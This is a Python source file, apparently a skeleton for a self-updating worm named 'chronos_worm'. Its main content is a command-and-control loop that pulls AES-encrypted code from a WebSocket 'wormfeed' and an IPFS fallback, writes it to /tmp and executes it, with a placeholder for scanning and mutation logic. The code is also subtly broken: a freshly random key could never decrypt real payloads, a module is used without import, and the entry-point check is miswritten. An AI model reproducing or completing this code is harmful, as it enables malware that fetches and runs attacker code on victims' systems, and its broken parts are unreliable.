# chronos_worm.py

import os, json, yaml, time, threading, asyncio, websockets, base64, importlib
import torch
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

CONFIG_PATHS = ["config.json", "config.yaml"]
UPDATE_SOURCE = {
    "websocket": "wss://example.com/wormfeed",
    "ipfs": "https://ipfs.io/ipfs/Qm...your_hash..."
}

def load_config():
    for path in CONFIG_PATHS:
        try:
            with open(path, 'r') as f:
                return json.load(f) if path.endswith(".json") else yaml.safe_load(f)
        except Exception:
            continue
    raise RuntimeError("No valid configuration found.")

def decrypt_payload(payload, key):
    cipher = AES.new(key, AES.MODE_EAX, nonce=payload[:16])
    decrypted = cipher.decrypt(payload[16:])
    return decrypted.decode()

def apply_update(code_str):
    update_path = "/tmp/worm_update.py"
    with open(update_path, "w") as f:
        f.write(code_str)
    mod_name = "worm_update"
    spec = importlib.util.spec_from_file_location(mod_name, update_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    if hasattr(mod, 'main'):
        print("[+] Executing updated module...")
        mod.main()

# --- WebSocket Updater ---
async def websocket_update_loop(secret_key):
    async with websockets.connect(UPDATE_SOURCE["websocket"]) as ws:
        while True:
            msg = await ws.recv()
            decoded = base64.b64decode(msg)
            code = decrypt_payload(decoded, secret_key)
            apply_update(code)
            await asyncio.sleep(60)

# --- IPFS Fallback ---
def check_ipfs_update(secret_key):
    try:
        r = requests.get(UPDATE_SOURCE["ipfs"])
        if r.status_code == 200:
            code = decrypt_payload(base64.b64decode(r.content), secret_key)
            apply_update(code)
    except Exception as e:
        print(f"[!] IPFS check failed: {e}")

# --- Spawned Thread ---
def start_update_mechanism(secret_key):
    threading.Thread(target=check_ipfs_update, args=(secret_key,), daemon=True).start()
    asyncio.run(websocket_update_loop(secret_key))

# ---- MAIN ENTRY ----
def main():
    config = load_config()
    print(f"[+] Loaded config: {config}")
    secret_key = get_random_bytes(16)  # Shared pre-agreed key (simplify with key agreement in prod)
    start_update_mechanism(secret_key)

    # Your worm payload logic here...
    while True:
        # placeholder for scanning, mutation, etc.
        time.sleep(config.get("delay", 10))

if name == "main":
    main()